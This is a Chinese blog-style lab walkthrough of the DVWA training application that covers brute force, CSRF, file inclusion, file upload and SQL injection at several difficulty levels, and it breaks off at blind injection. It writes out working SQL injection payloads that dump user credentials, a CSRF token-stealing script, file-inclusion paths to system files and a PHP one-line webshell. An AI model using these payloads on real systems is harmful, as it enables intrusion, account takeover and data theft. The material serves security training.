---
title: Web基础漏洞-DVWA
author: 简文涛
categories:
- Web
tags:
- DVWA
- Web基础漏洞
comments: true
top: false
summary: DVWA(Damn Vulnerable Web Application)一个用来进行安全脆弱性鉴定的PHP/MySQL Web测试环境
img: 'https://i.loli.net/2019/07/04/5d1dc9688233782463.png'
keywords: 'Web基础漏洞,DVWA,SQL,XSS,CSRF'
abbrlink: 27769
date: 2019-01-25 10:20:23
updated: 2019-07-02 10:20:23
permalink:
---
![](https://i.loli.net/2019/07/04/5d1dc9688233782463.png)

## 前言

DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。

安装请参考：[DVWA 安装配置](https://blog.csdn.net/sime_km/article/details/79891475)

## Brute-Force(暴力破解)

### Low

![](https://i.loli.net/2019/07/04/5d1dcab26fed861583.png)

**分析：**
`isset函数`在php中用来检测变量是否设置(该函数返回的是布尔类型的值，即true/false)
可以看到，服务器只是验证了参数Login是否被设置，没有任何的防爆破机制，且对参数username、password没有做任何过滤，存在明显的sql注入漏洞。

**方法一利用burpsuite爆破**
1.抓包
![](https://i.loli.net/2019/07/04/5d1dcab27b1f220628.png)
2.发送到intruder模块，进行爆破密码
![](https://i.loli.net/2019/07/04/5d1dcb3b8c08220782.png)
3.根据在爆破结果中找到正确的密码，可以看到password的响应包长度（length）“与众不同”，可推测password为正确密码，手工验证登陆成功。
![](https://i.loli.net/2019/07/04/5d1dcb3b8a75491398.png)

**方法二手工sql注入**

1. Username:admin’ or ’1′=’1  
Password:（空）

2. Username :admin’ #
Password :（空）

![](https://i.loli.net/2019/07/04/5d1dcb3d6a75595865.png)
### Medium

![](https://i.loli.net/2019/07/04/5d1dcb40c85d262854.png)


**分析：**
Medium级别的代码主要增加了`mysql_real_escape_string函数`，这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，基本上能够抵御sql注入攻击，同时$pass做了MD5校验，杜绝了通过参数password进行sql注入的可能性。但是，依然没有加入有效的防爆破机制.

**方法：**
虽然sql注入不再有效，但依然可以使用Burpsuite进行爆破，与Low级别的爆破方法基本一样。
##High：
![](https://i.loli.net/2019/07/04/5d1dcb6f298c445927.png)


**分析：**
High级别的代码加入了checkToken，可以抵御CSRF攻击，同时也增加了爆破的难度，通过抓包，可以看到，登录验证时提交了四个参数：username、password、Login以及user_token。
![](https://i.loli.net/2019/07/04/5d1dcb6f1637852381.png)

每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。同时，High级别的代码中，使用了stripslashes（去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个）、 mysql_real_escape_string对参数username、password进行过滤、转义，进一步抵御sql注入。

## CSRF(跨站请求伪造)

### Low

![](https://i.loli.net/2019/07/04/5d1dea4257e8833844.png)
<跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。>

`CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。`

该模块主要实现的是一个修改密码的操作，两次输入想要修改的密码点击提交修改密码。

**主要页面如下：**
![](https://i.loli.net/2019/07/04/5d1dea423586376487.png)

![](https://i.loli.net/2019/07/04/5d1dea6239b7878188.png)


**分析：**
服务器收到修改密码的请求后，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制，所以我们只需要用户在cookie还有效的时间内在相同的浏览器访问我们给定的url（该操作是服务器对请求的发送者进行了身份验证，检查cookie），就可以实现CSRF攻击，修改用户密码。

**Exploit**

1.构造如下链接：

```
http://127.0.0.1/vulnerabilities/csrf/password_new=test&password_conf=test&Change=Change#
```
当受害者点击了这个链接，密码就会被改成test
2.使用短链接来隐藏 URL：
为了更加隐蔽，可以生成短网址链接，点击短链接，会自动跳转到真实网站：

![](https://i.loli.net/2019/07/04/5d1dea424c1e274194.png)

因为本地搭的环境，服务器域名是ip所以无法生成相应的短链接，实际攻击场景下只要目标服务器的域名不是ip，是可以生成相应短链接的。

3.构造攻击页面：
通过img标签中的src属性来加载CSRF攻击利用的URL，并进行布局隐藏，实现了受害者点击链接则会将密码修改。
**构造的页面test.html如下:**
```html
<img src="http://127.0.0.1/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change#" border="0" style="display:none;"/> <h1>404<h1> <h2>file not found.<h2>
```
将test.html文件放在攻击者自己准备的网站上：

![](https://i.loli.net/2019/07/04/5d1dea623fabf95692.png)

当受害者正在使用自己的网站（浏览器中还保存着session值）时，访问攻击者诱惑点击的此链接:
[http://127.0.0.1/hack/test.html](http://127.0.0.1/hack/test.html)
误认为是自己点击的是一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改为test
![](https://i.loli.net/2019/07/04/5d1dea42c6e5974552.png)

我们将访问test.html时的数据包抓下来：可以很清楚的看到密码已经被修改

![](https://i.loli.net/2019/07/04/5d1dea43007d580090.png)

### Medium

![](https://i.loli.net/2019/07/04/5d1dea42d8a6954559.png)
```php
stripos(string,find,start)：函数查找字符串在另一字符串中第一次出现的位置,不区分大小写。

eregi(string pattern, string string)：检查string中是否含有pattern（不区分大小写），如果有返回True，反之False。
```
```php
PHP超全局变量$_SERVER中的两个值：

$_SERVER['HTTP_REFERER']：PHP中获取链接到当前页面的前一页面的url链接地址，即HTTP数据包中的Referer参数的值。

$_SERVER['SERVER_NAME']：PHP中获取服务器主机的名称，即HTTP数据包中的Host参数的值。
```
**分析：**
Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是127.0.0.1），希望通过这种机制抵御CSRF攻击。一开始就调用eregi()函数来判断HTTP头的referer字段里是不是包含“127.0.0.1”字符串，即发送请求的是不是本机，如果是则继续后面代码的执行。

**Exploit**
过滤规则是http包头的Referer参数的值中必须包含主机名（这里是127.0.0.1）
我们可以将攻击页面命名为127.0.0.1.html（页面被放置在攻击者的服务器里）就可以绕过了

![](https://i.loli.net/2019/07/04/5d1dea622accb74998.png)
我们还是按照之前的操作，先诱惑受害者点击http://127.0.0.1/test.html，抓包，并发送到Repeater中：
![](https://i.loli.net/2019/07/04/5d1dea439065213844.png)


执行失败，出现:That request didn't look correct.
此时让受害者访问127.0.0.1.html文件，即在Repeater中修改HTTP数据包中的Referer参数为：
![](https://i.loli.net/2019/07/04/5d1dea43877b539649.png)
成功修改了密码：
![](https://i.loli.net/2019/07/04/5d1dea442564524305.png)

##High:
![](https://i.loli.net/2019/07/04/5d1dea442ab2f51571.png)
**分析：**
High 的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。

**Exploit**

要绕过High 的反CSRF机制，关键是要获取token，要利用受害者的cookie去修改密码的页面获取关键的token。Cookie，指某些网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据（通常经过加密）。

试着去构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成 CSRF 攻击，下面是代码。
`xss.js:`
```javascript
alert(document.cookie);
var theUrl = 'http://www.dvwa.com/vulnerabilities/csrf/';
	if(window.XMLHttpRequest) {
		xmlhttp = new XMLHttpRequest();
	}else{
		xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
	}
var count = 0;
	xmlhttp.withCredentials = true;
	xmlhttp.onreadystatechange=function(){
		if(xmlhttp.readyState ==4 && xmlhttp.status==200)
		{
			var text = xmlhttp.responseText;
			var regex = /user_token\' value\=\'(.*?)\' \/\>/;
			var match = text.match(regex);
			console.log(match);
			alert(match[1]);
				var token = match[1];
					var new_url = 'http://127.0.0.1/vulnerabilities/csrf/?user_token='+token+'&password_new=test&password_conf=test&Change=Change';
					if(count==0){
						count++;
						xmlhttp.open("GET",new_url,false);
						xmlhttp.send();
					}
					

		}
	};
	xmlhttp.open("GET",theUrl,false);
	xmlhttp.send();
```
xss.js放置于攻击者的网站上：[http://127.0.0.1/xss.js](http://127.0.0.1/xss.js)

**攻击思路**是当受害者点击进入这个页面，脚本会通过一个看不见框架偷偷访问修改密码的页面，获取页面中的token，并向服务器发送改密请求，以完成CSRF攻击。

## File-Inclusion(文件包含)

>文件包含漏洞，是指当服务器开启allow_url_include选项时，就可以通过php的某些特性include()，require()，include_once()，require_once()利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项(选项开启之后，服务器允许包含一个远程的文件)。

```
文件包含分类：
LFI:本地文件包含(Local File Inclusion) 
RFI:远程文件包含(Remote File Inclusion)
```
```php
与文件包含有关的函数：
 include()：只有代码执行到该函数时才会包含文件进来，发生错误时只给出一个警告并继续向下执行。
 include_once()：和 include()功能相同，区别在于当重复调用同一文件时，程序只调用一次。
 require()：只要程序执行就包含文件进来，发生错误时会输出错误结果并终止运行。
 require_once()：和 require()功能相同，区别在于当重复调用同一文件时，程序只调用一次。
```
```php
相关的 php.ini 配置参数：
allow_url_fopen = on （默认开启） 
allow_url_include = on （默认关闭）
```
``远程文件包含是因为开启了 php 配置中的 allow_url_fopen 选项（选项开启之后，服务器允许包含一个远程的文件）。``

### Low

![](https://i.loli.net/2019/07/06/5d204976d8d1e23741.png)
**分析：**
服务器端对page参数没有做任何的过滤跟检查。
服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。
![](https://i.loli.net/2019/07/06/5d204976e734783864.png)

tips：服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。现实中，恶意的攻击者是不会乖乖点击这些链接的，因此page参数是不可控的。

点击file1.php，观察到url为：
`http://127.0.0.1/DVWA-1.9/vulnerabilities/fi/?page=file1.php`

**Exploit**
**1.本地文件包含**

构造url:
`http://127.0.0.1/DVWA-1.9/vulnerabilities/fi/?page=/etc/shadow`

![](https://i.loli.net/2019/07/06/5d204977d844410273.png)


现报错信息，显示没有这个文件，说明不是服务器系统不是Linux，但同时暴露了服务器文件的绝对路径D:\phpStudy\PHPTutorial\WWW\DVWA-1.9\

构造url（绝对路径）：
`http://127.0.0.1/DVWA-1.9/vulnerabilities/fi/?page=D:/phpStudy/PHPTutorial/WWW/DVWA-1.9/php.ini`

成功读取了服务器的php.ini文件。

![](https://i.loli.net/2019/07/06/5d204977144f872652.png)


构造url（相对路径）:
`http://127.0.0.1/DVWA-1.9/vulnerabilities/fi/?page=../../../DVWA-1.9/php.ini`

加这么多..\是为了保证到达服务器的D盘根目录，可以看到读取是成功的。

![](https://i.loli.net/2019/07/06/5d204976ebff869457.png)

读取phpstudy探针文件进行信息搜集
![](https://i.loli.net/2019/07/06/5d207a0cb53ea46545.png)


同时在读取上面的php.ini文件时，我们看到，配置文件中的magic_quote_gpc选项为off。

在php版本小于5.3.4的服务器中，当magic_quote_gpc选项为off时，我们可以在文件名中使用%00进行截断，也就是说文件名中%00后的内容不会被识别，即下面两个url是完全等效的。
```
http://127.0.0.1/DVWA-1.9/vulnerabilities/fi/?page=../../../dvwa/php.ini 
http://127.0.0.1/DVWA-1.9/vulnerabilities/fi/?page=../../../dvwa/php.ini%002
```
![](https://i.loli.net/2019/07/06/5d207a0cb937999670.png)
**2.远程文件包含**
当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件。如果对文件来源没有检查的话，就容易导致任意远程代码执行。

在远程服务器192.168.0.20上传一个phpinfo.txt文件，内容如下:
`<?php phpinfo();?>`

构造以下url，成功在服务器上执行了phpinfo()函数。
`127.0.0.1/DVWA-1.9/vulnerabilities/fi/?page=http://192.168.0.20/phpinfo.txt`
### Medium 

![](https://i.loli.net/2019/07/06/5d207a0c9b56070403.png)
str_replace(find,replace,string,count)
![](https://i.loli.net/2019/07/06/5d207a0d6359148858.png)

```php
eg:
把字符串 "Hello world!" 中的字符 "world" 替换为 "Shanghai"：
<?php
echo str_replace("world","Shanghai","Hello world!");
?>

```
**分析：**
增加了str_replace函数,将以下字符串替换为空。

```
【http://】，【https://】 ，【../】 ， 【..\】
```
**Exploit**
使用str_replace函数是极不安全的，可以使用双写绕过替换规则。
例如page=htthttp://p://192.168.0.20/phpinfo.txt时，str_replace函数会将http://删除，于是page=http://192.168.0.20/phpinfo.txt，成功执行远程命令。
同时，因为替换的只是../、..\，所以对采用绝对路径的方式包含文件是不会受到任何限制的。

**1.本地文件包含**

绝对路径不受任何影响，读取配置文件成功。
`http://127.0.0.1/DVWA-1.9/vulnerabilities/fi/?page=D:/phpStudy/PHPTutorial/WWW/DVWA-1.9/php.ini`

相对路径的利用以下payload,读取配置文件成功。
`http://127.0.0.1/DVWA-1.9/vulnerabilities/fi/?page=..././..././..././DVWA-1.9/php.ini`

**2.远程文件包含**

构造以下payload，远程执行命令成功。
`http://127.0.0.1/DVWA-1.9/vulnerabilities/fi/?page=htthttp://p://192.168.0.20/phpinfo.txt`

### High

![](https://i.loli.net/2019/07/06/5d207a0c9b61e46266.png)

**分析：**
High 的代码使用了fnmatch()函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。

**Exploit**
High 的代码规定只能包含file开头的文件，看似安全，不幸的是我们依然可以利用file协议绕过防护策略。
Tips：因为 fnmatch 函数适用于 PHP >= 4.3.0，因此 php 版本高于这个才能利用，否则会出现打不开 high 等级页面。

构造如下url，成功读取了服务器的配置文件。
`http://127.0.0.1/DVWA-1.9/vulnerabilities/fi/?page=file://D:/phpStudy/PHPTutorial/WWW/DVWA-1.9/php.ini`
![](https://i.loli.net/2019/07/06/5d207a0d8f75273269.png)
至于执行任意命令，需要配合文件上传漏洞利用。首先需要上传一个内容为php的文件，然后再利用file协议去包含上传文件(需要知道上传文件的绝对路径),从而实现任意命令执行。

## File-Upload(文件上传)

> 文件上传漏洞通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的。

### Low

![image-20200403143738244.png](https://i.loli.net/2020/04/03/AV64WaktEzxnS1p.png)

```php
函数介绍：
basename()函数返回路径中的文件名部分。
string basename ( string $path [, string $suffix ] )

参数介绍：
$path:必需。规定要检查的路径。在Windows中，斜线（/）和反斜线（\）都可以用作目录分隔符。在其它环境下是斜线（/）。
$suffix:可选。规定文件扩展名。如果文件有suffix，则不会输出这个扩展名。

举例：
<?php $path = "/testweb/home.php"; //显示带有文件扩展名的文件名 echo basename($path); //显示不带有文件扩展名的文件名 echo basename($path,".php"); ?>

输出：
home.php home
```
```
文件上传漏洞的利用的条件：
 1.能够成功上传木马文件
 2.上传文件必须能够被执行
 3.上传文件的路径必须可知
```
**漏洞利用**
因为对于上面的利用条件全都满足，直接上传文件x.php（一句话木马）
`<?php @eval($_POST['x']);?>`
![image-20200403142517653.png](https://i.loli.net/2020/04/03/tePGWlkyoaAd13X.png)

上传成功得到路径：
http://127.0.0.1/DVWA-1.9/hackable/uploads/x.php 密码为你配置中`_POST['x']中的x`  
例如：一句话木马`<?php @eval($_POST['shell']);?>` 则密码就是shell
菜刀连接：就可以操控文件夹，干坏事了
![image-20200403142316132](https://i.loli.net/2020/04/03/RkWqD9zHuOJCvwn.png)

![image-20200403142334713.png](https://i.loli.net/2020/04/03/ko4ME2B6LUsaXFt.png)

### Medium

![image-20200403142358155.png](https://i.loli.net/2020/04/03/PgrGZVx5SqCNtIj.png)

**分析：**
Medium的代码对上传文件的类型、大小做了限制，要求文件类型必须是jpeg或者png，大小不能超过 100000B（约为 97.6KB）
普通上传一个php文件时，出现报错提示：

![image-20200403143628597](../images/Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8-DVWA/image-20200403143628597.png)


**漏洞利用**
**1.抓包修改文件类型**
上传x.png文件，使用Burpsuite抓包:

![image-20200403143614223.png](https://i.loli.net/2020/04/03/njtV8DC4qHdiQcy.png)

![image-20200403143601265.png](https://i.loli.net/2020/04/03/uHla3Vy6xEMB8Zr.png)

可以看到文件类型为image/png，尝试修改filename为x.php

![image-20200403143535879.png](https://i.loli.net/2020/04/03/1UJzQ3HNWbAMBxD.png)

上传成功：

![image-20200403143451758](https://i.loli.net/2020/04/03/GcVWXItLjwhaCZg.png)
上传后成功得到x.php文件：

![image-20200403143432202.png](https://i.loli.net/2020/04/03/FZGHhlUTp4gLK6Y.png)

菜刀连接：http://127.0.0.1/hackable/uploads/x.php
**2.%00 截断上传绕过**
在php版本小于 5.3.4 的服务器中，当magic_quote_gpc选项为off时，可以在文件名中使用%00截断，所以可以把上传文件命名为x.php%00.png。
<img src="https://i.loli.net/2020/04/03/dAksqYD9yIzP1RT.png" alt="image-20200403143411914"  />
可以看到，包中的文件类型为image/png，可以通过文件类型检查。点击上传后：

![image-20200403143354566.png](https://i.loli.net/2020/04/03/1z9v8Lfe64xkiaE.png)

服务器会认为其文件名为x.php，顺势解析为php文件。
菜刀连接：http://127.0.0.1/hackable/uploads/x.php%00.png
![image-20200403143340611](../images/Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8-DVWA/image-20200403143340611.png)

**3.文件上传+文件包含**
因为采用的是一句话木马，所以文件大小符合要求，至于文件类型的检查，尝试修改文件名为x.png，上传成功：
![image-20200403143326071](https://i.loli.net/2020/04/03/LpZ2hU1YN5nbaT9.png)

但不能解析识别出是PHP文件，菜刀连接报错。
此时我们想到文件包含漏洞的利用。这里可以借助Medium 的文件包含漏洞来获取webshell权限，利用方式如下：
本地文件包含：成功读取x.png文件内容
`http://127.0.0.1/vulnerabilities/fi/?page=D:/phpStudy/PHPTutorial/WWW/hackable/uploads/x.png`
远程文件包含：
`http://127.0.0.1/vulnerabilities/fi/?page=hthttp://tp://127.0.0.1/hackable/uploads/x.png`
成功获取webshell权限：
![image-20200403143309889](https://i.loli.net/2020/04/03/F1Gi3djvVTXHYea.png)

两种方式，菜刀均可以成功连接。

<img src="https://i.loli.net/2020/04/03/UIbW6i9Fv1LdMgE.png" alt="image-20200403143253660" style="zoom: 80%;" />

### High

![image-20200403142953650](https://i.loli.net/2020/04/03/RGedp3CKyN5Ivmg.png)
```php
strrpos()函数：

strrpos(string,find,start)

函数返回字符串find在另一字符串string中最后一次出现的位置，如果没有找到字符串则返回false，可选参数start规定在何处开始搜索。

strtolower()函数：

strtolower(string)

把字符串转换为小写。

getimagesize()函数：

getimagesize(string filename)

getimagesize()函数用于获取图像大小及相关信息，成功则返回一个数组，失败则返回FALSE并产生一条E_WARNING级的错误信息。

```
函数详细参考：
[PHP strrpos() 函数](http://www.w3school.com.cn/php/func_string_strrpos.asp)            
[PHP getimagesize 函数](http://www.5idev.com/p-php_getimagesize.shtml)
**分析：**
High的代码读取文件名中最后一个”.”后的字符串，通过文件名来限制文件类型因此要求上传文件名形式必须是*.jpg、*.jpeg 、*.png三者之一。getimagesize()函数更是限制了上传文件的文件头必须为图像类型。
**Exploit**
利用思路主要是：绕过getimagesize()函数检测识别和上传文件名的检测识别
让getimagesize()函数检测无效的方法：文件头欺骗，继而使得getimagesize()函数无法判断。

**文件头相关的知识：**
```
常见的图片格式的文件头标识如下：
JPEG/JPG - 文件头标识 (2 bytes): FF D8 (SOI) (JPEG 文件标识) - 文件结束标识 (2 bytes): FF D9 (EOI) 

PNG - 文件头标识 (8 bytes) :  89 50 4E 47 0D 0A 1A 0A

GIF - 文件头标识 (6 bytes) :  47 49 46 38 39(37) 61 
```
更多文件头标识参见文章：[通过文件头标识判断图片格式](http://www.cnblogs.com/Wendy_Yu/archive/2011/12/27/2303118.html)

文件头欺骗：伪造文件头，使文件头标识一样，其它部分我们修改为一句话木马，也就成了我们常说的图片一句话。

**常见的图片一句话制作方法：**
先用C32Asm十六进制模式打开y.png，然后将x.php拖入，然后另存为z.png
![image-20200403142933279.png](https://i.loli.net/2020/04/03/4GX71AeQ8o3xlZP.png)
之后，我们将制作好的图片一句话，用getimagesize()函数识别测试，并与原图片文件对比，打印输出：

```php
<?php

header("Content-type: text/html; charset=utf-8"); 

echo "y.png:";

$array0 = getimagesize("images/y.png");
print_r($array0);

echo "<br />";

echo "copy 命令制作的图片一句话 z1.png:";

$array1 = getimagesize("images/z1.png");
print_r($array1);

echo "C32Asm 制作的图片一句话 z2.png:";

$array2 = getimagesize("images/z2.png");
print_r($array2);
?>
```
以上是打印输出的file.php文件。

![image-20200403142911141.png](https://i.loli.net/2020/04/03/XuYsmI4vSgZNhKA.png)

我们发现得到的数组内容没有丝毫改变，
从而证明了该方法可以绕过getimagesize()函数的检测识别。接着我们再来进行利用：

**1.%00 截断上传绕过**
采用%00截断的方法可以轻松绕过文件名的检查，采用刚才的图片一句话进行上传。（适用于php小于 5.3.4 版本）
菜刀连接：`http://127.0.0.1/hackable/uploads/z.php%00.png`

**2.文件上传 + 文件包含**
通过上传图片一句话和借助High的文件包含漏洞来进行利用：
菜刀连接：
`http://127.0.0.1/vulnerabilities/fi/?page=file:///D:/phpStudy/PHPTutorial/WWW/hackable/uploads/z.png`


## SQL-Injection(SQL注入)

>SQL注入，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。SQL注入漏洞的危害是巨大的，常常会导致整个数据库被“脱裤”，尽管如此，SQL注入仍是现在最常见的Web漏洞之一。


```
SQL 注入分类
按SQLMap中的分类来看，SQL注入类型有以下 5 种：
 UNION query SQL injection（可联合查询注入） 
 Stacked queries SQL injection（可多语句查询注入）
 Boolean-based blind SQL injection（布尔型注入） 
 Error-based SQL injection（报错型注入）
 Time-based blind SQL injection（基于时间延迟注入）
```
```
SQL 注入常规利用思路：
1、寻找注入点，可以通过 web 扫描工具实现 
2、通过注入点，尝试获得关于连接数据库用户名、数据库名称、连接数据库用户权限、操作系统信息、数据库版本等相关信息。 
3、猜解关键数据库表及其重要字段与内容（常见如存放管理员账户的表名、字段名等信息）
4、可以通过获得的用户信息，寻找后台登录。 
5、利用后台或了解的进一步信息，上传 webshell 或向数据库写入一句话木马，以进一步提权，直到拿到服务器权限。
```
```
手工注入常规思路：
1.判断是否存在注入，注入是字符型还是数字型 
2.猜解 SQL 查询语句中的字段数
3.确定显示的字段顺序 
4.获取当前数据库 
5.获取数据库中的表 
6.获取表中的字段名 
7.查询到账户的数据
```
### Low

![](https://i.loli.net/2019/07/07/5d2157a0b617429320.png)
**分析：**
由代码可知，通过`REQUEST`方式接受传递的参数id，再通过sql语句带入查询，并未设置任何过滤，因此可以进行sql注入利用。
**常见注入测试的POC：**
![](https://i.loli.net/2019/07/07/5d2157a0e026b11081.png)

**1.判断是否存在注入，注入是字符型还是数字型**

当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。

`输入1，查询成功`
![](https://i.loli.net/2019/07/07/5d2157a0b5be796424.png)

`输入1'and '1' ='2，查询失败，返回结果为空：`
![](https://i.loli.net/2019/07/07/5d2157a0b3f3273859.png)

`输入1' or '1'='1 页面正常，并返回更多信息，成功查询`

![](https://i.loli.net/2019/07/07/5d2159616334d72827.png)

*``判断存在的是字符型注入。``*

**2.猜解SQL查询语句中的字段数**

```sql
1' or 1=1 order by 1 # 
查询成功
```



![](https://i.loli.net/2019/07/07/5d2157a13017358980.png)

```sql
1' or 1=1 order by 2 # 
查询成功 #是注释作用
```



![](https://i.loli.net/2019/07/07/5d2157a130bfc36506.png)

````sql
1' or 1=1 order by 3 # 
查询失败
````

![](https://i.loli.net/2019/07/07/5d2157a14b88a69607.png)
`说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。`

**3.确定显示的字段顺序**

`输入1' union select 1,2 # 查询成功： #是注释作用`
![](https://i.loli.net/2019/07/07/5d2157a15b62731652.png)
`说明执行的SQL语句为select First name,Surname from 表 where ID=’id’…`

**4.获取当前数据库**
`输入1' union select 1,database() # 查询成功：#是注释作用`
![](https://i.loli.net/2019/07/07/5d215880225ab67916.png)

`说明当前的数据库为dvwa。`

**5.获取数据库中的表**

`输入1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # 查询成功： #是注释作用`

![](https://i.loli.net/2019/07/07/5d2158801e99398127.png)

`说明数据库dvwa中一共有两个表，guestbook与users。`

**6.获取表中的字段名**

`输入1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' # 查询成功： #是注释作用`

![](https://i.loli.net/2019/07/07/5d215a91e7a8398188.png)

`说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。`

7.下载数据

`输入1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功： #是注释作用`

![](https://i.loli.net/2019/07/07/5d21587feccc627920.png)

`这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。`

### Medium

**分析:**
Medium级别的代码利用mysql_real_escape_string函数对特殊符号\x00,\n,\r,\,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。
![](https://i.loli.net/2019/07/07/5d21587fd0b4470385.png)
**漏洞利用**
虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数，提交恶意构造的查询参数。

**1.判断是否存在注入，注入是字符型还是数字型**

`抓包更改参数id为1' or 1=1 # 报错： #是注释作用`
![](https://i.loli.net/2019/07/07/5d215880841a018106.png)

`抓包更改参数id为1 or 1=1 #，查询成功`

![](https://i.loli.net/2019/07/07/5d2158809d36989122.png)

`说明存在数字型注入。`
（由于是数字型注入，服务器端的mysql_real_escape_string函数就形同虚设了，因为数字型注入并不需要借助引号。）

**2.猜解SQL查询语句中的字段数**

`抓包更改参数id为1 order by 2 #，查询成功：`
![](https://i.loli.net/2019/07/07/5d2159616a21092023.png)

`抓包更改参数id为1 order by 3 #，报错：`

![](https://i.loli.net/2019/07/07/5d215880a147828497.png)

`说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。`

**3.确定显示的字段顺序**

`抓包更改参数id为1 union select 1,2 #，查询成功：`
![](https://i.loli.net/2019/07/07/5d2158812929b87606.png)
`说明执行的SQL语句为select First name,Surname from 表 where ID=id…`

**4.获取当前数据库**

`抓包更改参数id为1 union select 1,database() #，查询成功：`
![](https://i.loli.net/2019/07/07/5d2159616494195158.png)

`说明当前的数据库为dvwa。`

**5.获取数据库中的表**

`抓包更改参数id为1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功：`

![](https://i.loli.net/2019/07/07/5d2158816989128964.png)


`说明数据库dvwa中一共有两个表，guestbook与users。`

**6.获取表中的字段名**

`抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #，查询失败：`

![](https://i.loli.net/2019/07/07/5d2159645009a24115.png)

这是因为单引号被转义了，变成了`\'`。可以利用16进制进行绕过 ''

`抓包更改参数id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0×7573657273 #，查询成功：`

![](https://i.loli.net/2019/07/07/5d21596186ab196293.png)

`说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。`

**7.下载数据**

`抓包修改参数id为1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：`

![](https://i.loli.net/2019/07/07/5d2159620af4d15231.png)


这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。

### High

![](https://i.loli.net/2019/07/07/5d215961dd3a893165.png)

**分析：**
与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。

**漏洞利用:**
虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。由于手工注入的过程与Low级别基本一样，直接最后一步演示下载数据。

`输入1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：`

![](https://i.loli.net/2019/07/07/5d21596231dc818326.png)

**特别注意：**High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。

## SQL-Injection(Blind)(SQL盲注)

> SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。

```
盲注中常用的几个函数：
substr(a,b,c)：从b位置开始，截取字符串a的c长度 
count()：计算总数 
ascii()：返回字符的ascii码 
length()：返回字符串的长度 left(a,b)：从左往右截取字符串a的前b个字符 
sleep(n):将程序挂起n秒
```
**手工盲注思路**

手工盲注的过程，就像你与一个机器人聊天，这个机器人知道的很多，但只会回答“是”或者“不是”，因此你需要询问它这样的问题，例如“数据库名字的第一个字母是不是a啊？”，通过这种机械的询问，最终获得你想要的数据。

盲注分为基于布尔的盲注、基于时间的盲注以及基于报错的盲注，这里只演示基于布尔的盲注与基于时间的盲注。
```
下面简要介绍手工盲注的步骤（可与之前的手工注入作比较）：

1.判断是否存在注入，注入是字符型还是数字型 
2.猜解当前数据库名 
3.猜解数据库中的表名
4.猜解表中的字段名 
5.猜解数据
```
###  Low

![image-20200403135051500](https://i.loli.net/2020/04/03/RhjDfIrv4G53gpK.png)

**分析：**
